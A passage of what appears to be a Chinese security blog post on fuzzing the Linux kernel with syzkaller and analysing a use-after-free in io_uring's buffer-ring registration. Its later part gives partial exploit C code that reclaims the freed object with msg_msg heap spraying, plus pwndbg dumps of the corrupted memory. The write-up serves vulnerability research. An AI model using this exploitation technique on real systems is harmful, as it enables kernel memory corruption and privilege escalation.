class="line">2023/12/07 02:54:01 namespace sandbox       : enabled</span><br><span class="line">2023/12/07 02:54:01 Android sandbox         : enabled</span><br><span class="line">2023/12/07 02:54:01 fault injection         : CONFIG_FAULT_INJECTION is not enabled</span><br><span class="line">2023/12/07 02:54:01 leak checking           : CONFIG_DEBUG_KMEMLEAK is not enabled</span><br><span class="line">2023/12/07 02:54:01 net packet injection    : /dev/net/tun does not exist</span><br><span class="line">2023/12/07 02:54:01 net device setup        : enabled</span><br><span class="line">2023/12/07 02:54:01 concurrency sanitizer   : /sys/kernel/debug/kcsan does not exist</span><br><span class="line">2023/12/07 02:54:01 devlink PCI setup       : PCI device 0000:00:10.0 is not available</span><br><span class="line">2023/12/07 02:54:01 NIC VF setup            : PCI device 0000:00:11.0 is not available</span><br><span class="line">2023/12/07 02:54:01 USB emulation           : /dev/raw-gadget does not exist</span><br><span class="line">2023/12/07 02:54:01 hci packet injection    : /dev/vhci does not exist</span><br><span class="line">2023/12/07 02:54:01 wifi device emulation   : /sys/class/mac80211_hwsim/ does not exist</span><br><span class="line">2023/12/07 02:54:01 802.15.4 emulation      : /sys/bus/platform/devices/mac802154_hwsim does not exist</span><br><span class="line">2023/12/07 02:54:01 swap file               : enabled</span><br><span class="line">2023/12/07 02:54:01 corpus                  : 179 (deleted 0 broken)</span><br></pre></td></tr></table></figure>
<p>开始 fuzz 后，在 <a target="_blank" rel="noopener" href="http://127.0.0.1:56741/">http://127.0.0.1:56741/</a> 可以查看详细信息：</p>
<p><img src="/2023/12/09/fuzz%E5%B7%A5%E5%85%B7syzkaller%E7%9A%84%E4%BD%BF%E7%94%A8+io_uring%E6%A8%A1%E5%9D%97UAF%E6%BC%8F%E6%B4%9E/1701887988901.png" alt="1701887988901">  </p>
<p><strong>syscall description 的编写</strong></p>
<p>syzkaller 自己定义了一套描述系统调用模版的声明式语言 syzlang</p>
<ul>
<li>为了提高 fuzz 效率，我们必须为目标系统量身定制这种声明文件</li>
<li>通常一个设备节点对应一个声明文件</li>
<li>所谓的声明文件就是一个 txt，根据 syzkaller 定义的语法，在这个 txt 文档中描述设备节点的接口信息以及参数格式</li>
</ul>
<p>整个定制过程分为4步：</p>
<ol>
<li>根据目标内核模块的信息，撰写符合 syzlang 语法的 txt 声明文件</li>
<li>syz-extract 根据 txt 及 linux 源码，提取符号常量的值，生成中间文件（.const 文件）</li>
<li>syz-sysgen 根据 const 文件生成 syzkaller 执行时使用的 go 文件</li>
<li>重新编译 syzkaller</li>
</ol>
<p>使用如下命令编译自定义模块：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/syz-extract -os linux -arch amd64 -sourcedir &quot;/home/yhellow/pwntest/code/linux-5.19.2&quot; test.txt</span><br></pre></td></tr></table></figure>
<p>编译完成后运行 syz-sysgen，然后重新编译 syzkaller：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bin/syz-sysgen</span><br><span class="line">make generate</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<ul>
<li>该步骤将更新 <code>/syzkaller/sys/linux/gen/amd64.go</code>，自动添加上新定义的系统调用 </li>
</ul>
<p>syzkaller 源码中的 <code>/syzkaller/sys/linux</code> 目录下专门记录有各个常用模块的 syzlang 文档（已经编译完成），本实验我们需要使用 <code>io_uring.txt</code></p>
<p>为了提高 fuzz 效率，增加了 “enable_syscalls” 项，只允许某些系统调用，能更快地触发漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="string">&quot;target&quot;</span>: <span class="string">&quot;linux/amd64&quot;</span>,</span><br><span class="line">	<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:56741&quot;</span>,</span><br><span class="line">	<span class="string">&quot;rpc&quot;</span>: <span class="string">&quot;127.0.0.1:0&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sshkey&quot;</span> : <span class="string">&quot;/home/yhellow/pwntest/image/bullseye.id_rsa&quot;</span>, </span><br><span class="line">	<span class="string">&quot;workdir&quot;</span>: <span class="string">&quot;/home/yhellow/pwntest/workdir&quot;</span>,</span><br><span class="line">	<span class="string">&quot;kernel_obj&quot;</span>: <span class="string">&quot;/home/yhellow/pwntest/code/linux-5.19-rc2&quot;</span>,</span><br><span class="line">	<span class="string">&quot;syzkaller&quot;</span>: <span class="string">&quot;/home/yhellow/Tools/syzkaller&quot;</span>, </span><br><span class="line">	<span class="string">&quot;sandbox&quot;</span>: <span class="string">&quot;setuid&quot;</span>,</span><br><span class="line">	<span class="string">&quot;type&quot;</span>: <span class="string">&quot;isolated&quot;</span>,</span><br><span class="line">	<span class="string">&quot;enable_syscalls&quot;</span>:[</span><br><span class="line">        		<span class="string">&quot;io_uring_register$IORING_REGISTER_PBUF_RING&quot;</span>, <span class="comment">/* 漏洞所在模块 */</span></span><br><span class="line">        		<span class="string">&quot;io_uring_setup&quot;</span></span><br><span class="line">    			],</span><br><span class="line">	<span class="string">&quot;vm&quot;</span>: &#123;</span><br><span class="line">		<span class="string">&quot;targets&quot;</span> : [ <span class="string">&quot;127.0.0.1:10021&quot;</span> ],</span><br><span class="line">		<span class="string">&quot;pstore&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">		<span class="string">&quot;target_dir&quot;</span> : <span class="string">&quot;/root/fuzzdir&quot;</span>, </span><br><span class="line">		<span class="string">&quot;target_reboot&quot;</span> : <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分析 crash 文件</strong></p>
<p>所有 fuzz 出的 crash 信息都存储在 <code>/workdir/crashes</code> 中</p>
<p>当 syzkaller fuzz 遇到 crash 后会尝试复现该 crash：（并不是每一次都能成功）</p>
<p><img src="/2023/12/09/fuzz%E5%B7%A5%E5%85%B7syzkaller%E7%9A%84%E4%BD%BF%E7%94%A8+io_uring%E6%A8%A1%E5%9D%97UAF%E6%BC%8F%E6%B4%9E/1701933275474.png" alt="1701933275474"> </p>
<p>当 syzkaller 成功复现 crash 时，会出现如下信息：</p>
<p><img src="/2023/12/09/fuzz%E5%B7%A5%E5%85%B7syzkaller%E7%9A%84%E4%BD%BF%E7%94%A8+io_uring%E6%A8%A1%E5%9D%97UAF%E6%BC%8F%E6%B4%9E/1701933554055.png" alt="1701933554055">  </p>
<ul>
<li>PS：有时候复现的 C 代码特别奇怪，也不能触发 crash，不能完全采信</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>分析核心系统调用 <code>syscall(__NR_io_uring_register)</code> 对应的内核源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __io_uring_register(struct io_ring_ctx *ctx, <span class="keyword">unsigned</span> opcode,</span><br><span class="line">			       <span class="keyword">void</span> __user *arg, <span class="keyword">unsigned</span> nr_args)</span><br><span class="line">	__releases(ctx-&gt;uring_lock)</span><br><span class="line">	__acquires(ctx-&gt;uring_lock)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We&#x27;re inside the ring mutex, if the ref is already dying, then</span></span><br><span class="line"><span class="comment">	 * someone else killed the ctx or is already going through</span></span><br><span class="line"><span class="comment">	 * io_uring_register().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (percpu_ref_is_dying(&amp;ctx-&gt;refs))</span><br><span class="line">		<span class="keyword">return</span> -ENXIO;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;restricted) &#123;</span><br><span class="line">		<span class="keyword">if</span> (opcode &gt;= IORING_REGISTER_LAST)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		opcode = array_index_nospec(opcode, IORING_REGISTER_LAST);</span><br><span class="line">		<span class="keyword">if</span> (!test_bit(opcode, ctx-&gt;restrictions.register_op))</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">            ......</span><br><span class="line">	<span class="keyword">case</span> IORING_REGISTER_PBUF_RING:</span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">		<span class="keyword">if</span> (!arg || nr_args != <span class="number">1</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		ret = io_register_pbuf_ring(ctx, arg); <span class="comment">/* 漏洞函数 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">            ......</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		ret = -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">io_register_pbuf_ring</span><span class="params">(struct io_ring_ctx *ctx, <span class="keyword">void</span> __user *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_ring</span> *<span class="title">br</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span> *<span class="title">bl</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> **<span class="title">pages</span>;</span></span><br><span class="line">	<span class="keyword">int</span> nr_pages;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="keyword">sizeof</span>(reg)))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (reg.pad || reg.resv[<span class="number">0</span>] || reg.resv[<span class="number">1</span>] || reg.resv[<span class="number">2</span>])</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (!reg.ring_addr)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (reg.ring_addr &amp; ~PAGE_MASK)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (!is_power_of_2(reg.ring_entries))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(reg.bgid &lt; BGID_ARRAY &amp;&amp; !ctx-&gt;io_bl)) &#123; <span class="comment">/* 为io uring context分配io buffer list对象数组 */</span></span><br><span class="line">		<span class="keyword">int</span> ret = io_init_bl_list(ctx); <span class="comment">/* 这里分配了ctx-&gt;io_bl[64] */</span></span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	bl = io_buffer_get_list(ctx, reg.bgid); <span class="comment">/* 根据提供的buffer group id找到对应的缓冲区链表 */</span></span><br><span class="line">	<span class="keyword">if</span> (bl) &#123;</span><br><span class="line">		<span class="comment">/* if mapped buffer ring OR classic exists, don&#x27;t allow */</span></span><br><span class="line">		<span class="keyword">if</span> (bl-&gt;buf_nr_pages || !list_empty(&amp;bl-&gt;buf_list))</span><br><span class="line">			<span class="keyword">return</span> -EEXIST;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		bl = kzalloc(<span class="keyword">sizeof</span>(*bl), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!bl)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pages = io_pin_pages(reg.ring_addr,</span><br><span class="line">			     struct_size(br, bufs, reg.ring_entries),</span><br><span class="line">			     &amp;nr_pages); <span class="comment">/* 分配FOLL_PIN的页 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(pages)) &#123;</span><br><span class="line">		kfree(bl);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(pages);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	br = page_address(pages[<span class="number">0</span>]); <span class="comment">/* buffer ring所在地址 */</span></span><br><span class="line">	bl-&gt;buf_pages = pages;</span><br><span class="line">	bl-&gt;buf_nr_pages = nr_pages;</span><br><span class="line">	bl-&gt;nr_entries = reg.ring_entries;</span><br><span class="line">	bl-&gt;buf_ring = br;</span><br><span class="line">	bl-&gt;mask = reg.ring_entries - <span class="number">1</span>;</span><br><span class="line">	io_buffer_add_list(ctx, bl, reg.bgid); <span class="comment">/* 设置bl-&gt;bgid=reg.bgid,并将其添加到ctx的XArray中 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先检查传入的参数，并在 <code>io_uring_context</code> 中分配 <code>io_buffer_list</code> 对象数组 <code>ctx-&gt;io_bl</code></li>
<li>然后根据参数中的缓冲区组ID找到对应的 <code>io_buffer_list</code> 对象</li>
<li>然后调用 <code>io_pin_pages</code> 尝试根据用户给定的地址和长度分配 FOLL_PIN 的页</li>
<li>如果分配分配失败，就直接释放掉 <code>io_buffer_list</code> 对象（变量 <code>bl</code> 指向的是对象数组中的一项，不能单独释放，因而触发报错）</li>
</ul>
<p>变量 <code>bl=&amp;ctx-&gt;io_bl[bgid]</code>，如果 <code>bgid=0</code>，就可以释放整个 <code>ctx-&gt;io_bl</code>（不会触发报错），但是释放之后并没有清除 <code>ctx-&gt;io_bl</code>，后续使用就会造成 UAF</p>
<ul>
<li>PS：从后续修复的代码来看，设计者可能只是想释放由 <code>kzalloc(sizeof(*bl), GFP_KERNEL)</code> 申请的内存，但是没有考虑周全</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>有 UAF 的对象大小为 0x800（使用 kmalloc-2k），可以尝试利用 msg_msg 占用 UAF 堆块，然后利用 <code>io_provide_buffers()</code> 在链表 <code>ctx-&gt;io_bl[0].buf_list</code> 上添加一个 <code>io_buffer</code> 对象</p>
<p>测试脚本如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">   init_io_uring();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)&#123;</span><br><span class="line">       <span class="keyword">if</span> ((msgid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">           err_exit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   do_free_first();</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;try to get UAF object&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span>* <span class="title">msg</span> =</span> (struct msgbuf*)buffer;</span><br><span class="line">   <span class="keyword">int</span> msg_len = <span class="number">0x420</span> - <span class="number">0x30</span>;</span><br><span class="line">   msg-&gt;mtype = <span class="number">0x0001</span>; </span><br><span class="line">   <span class="built_in">memset</span>(msg-&gt;mtext, <span class="string">&#x27;\x00&#x27;</span>, msg_len);</span><br><span class="line">   msgsnd(msgid[<span class="number">0</span>], msg, msg_len, <span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将io_buffer链接到ctx-&gt;io_bl[0],伪造一个msg_msg对象 */</span></span><br><span class="line">   <span class="keyword">void</span>* pbuf = do_mmap(PBUF_BASE, PAGE_SIZE); </span><br><span class="line">   sqes-&gt;opcode = IORING_OP_PROVIDE_BUFFERS;</span><br><span class="line">   sqes-&gt;rw_flags = <span class="number">0</span>;</span><br><span class="line">   sqes-&gt;splice_fd_in = <span class="number">0</span>;</span><br><span class="line">   sqes-&gt;fd = <span class="number">1</span>; </span><br><span class="line">   sqes-&gt;addr = pbuf; <span class="comment">// io_buffer-&gt;addr对应msg_msg-&gt;m_type</span></span><br><span class="line">   sqes-&gt;len = <span class="number">0xFD0</span>; <span class="comment">// io_buffer-&gt;len对应msg_msg-&gt;m_ts</span></span><br><span class="line">   sqes-&gt;buf_group = <span class="number">0</span>; <span class="comment">// 链接到ctx-&gt;io_bl[buf_group](这里&#x27;0&#x27;对应msg_msg的头部, 可以伪造msg_msg)</span></span><br><span class="line">   submit_provide_buffer();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 从ctx-&gt;io_buffer_cache中分配两对象,获取指向ctx-&gt;io_bl[33]的指针,从而找到kmalloc-2k的地址 */</span></span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2</span>; i++) &#123;</span><br><span class="line">       sqes-&gt;addr = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">       sqes-&gt;len = <span class="number">0x100</span>;</span><br><span class="line">       sqes-&gt;buf_group = <span class="number">0x21</span>; <span class="comment">/* 0x420后面的都是可用的io_buffer_list(没有被msg_msg覆盖),因此链接到0x420这个位置(0x420/0x20=0x21) */</span></span><br><span class="line">       submit_provide_buffer();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;submit_provide_buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">uint64_t</span>* tag = (<span class="keyword">uint64_t</span>*)(buffer + <span class="number">0xF00</span>);</span><br><span class="line">   *tag = <span class="number">0xdeadbeef</span>;</span><br><span class="line">   <span class="keyword">pthread_t</span> th;</span><br><span class="line">   pthread_create(&amp;th, <span class="literal">NULL</span>, worker, buffer);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> (*tag == <span class="number">0xdeadbeef</span>) ;</span><br></pre></td></tr></table></figure>
<p>正常状态下的 <code>io_buffer_list</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8880059f6800</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rbp <span class="number">0xffff8880059f6800</span> ◂— <span class="number">0xffff8880059f6800</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0xffff8880059f6808</span> —▸ <span class="number">0xffff8880059f6800</span> ◂— <span class="number">0xffff8880059f6800</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0xffff8880059f6810</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0xffff8880059f6818</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0xffff8880059f6820</span> ◂— <span class="number">0xffff8880059f6820</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0xffff8880059f6828</span> —▸ <span class="number">0xffff8880059f6820</span> ◂— <span class="number">0xffff8880059f6820</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0xffff8880059f6830</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0xffff8880059f6838</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>被 <code>msg_msg</code> 覆盖后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8880059f6800</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff8880059f6800</span> —▸ <span class="number">0xffff8880059d56c0</span> ◂— <span class="number">0xffff8880059f6800</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff8880059f6808</span> —▸ <span class="number">0xffff8880059d56c0</span> —▸ <span class="number">0xffff8880059f6800</span> ◂— <span class="number">0xffff8880059d56c0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff8880059f6810</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff8880059f6818</span> ◂— <span class="number">0x3f0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff8880059f6820</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xffff8880059f6828</span> —▸ <span class="number">0xffff8880051ab548</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0xffff8880059f6830</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0xffff8880059f6838</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>msg_msg</code> 覆盖大小为 0x420，后续的 <code>io_buffer_list</code> 正常</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8880059f6800</span>+<span class="number">0x420</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff8880059f6c20</span> —▸ <span class="number">0xffff888005a16020</span> —▸ <span class="number">0xffff888005a16040</span> ◂— <span class="number">0xffff8880059f6c20</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff8880059f6c28</span> —▸ <span class="number">0xffff888005a16040</span> —▸ <span class="number">0xffff8880059f6c20</span> —▸ <span class="number">0xffff888005a16020</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff8880059f6c30</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff8880059f6c38</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff8880059f6c40</span> ◂— <span class="number">0xffff8880059f6c40</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xffff8880059f6c48</span> —▸ <span class="number">0xffff8880059f6c40</span> ◂— <span class="number">0xffff8880059f6c40</span></span><br></pre></td></tr></table></figure>
<p>添加 <code>io_buffer</code> 对象后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8880059f6800</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xffff8880059f6800</span> —▸ <span class="number">0xffff8880059d56c0</span> —▸ <span class="number">0xffff888005a16000</span> ◂— <span class="number">0xffff8880059f6800</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xffff8880059f6808</span> —▸ <span class="number">0xffff888005a16000</span> —▸ <span class="number">0xffff8880059f6800</span> —▸ <span class="number">0xffff8880059d56c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xffff8880059f6810</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xffff8880059f6818</span> ◂— <span class="number">0x3f0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xffff8880059f6820</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xffff8880059f6828</span> —▸ <span class="number">0xffff8880051ab548</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0xffff8880059f6830</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0xffff8880059f6838</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对于 <code>msg_msg</code> 而言，程序会误以为 <code>io_buffer</code> 对象也是 <code>msg_msg</code> 结构体</li>
<li>打印位于 <code>ctx-&gt;io_buffer_cache</code> 的 <code>io_buffer</code> 对象：</li>
</ul>
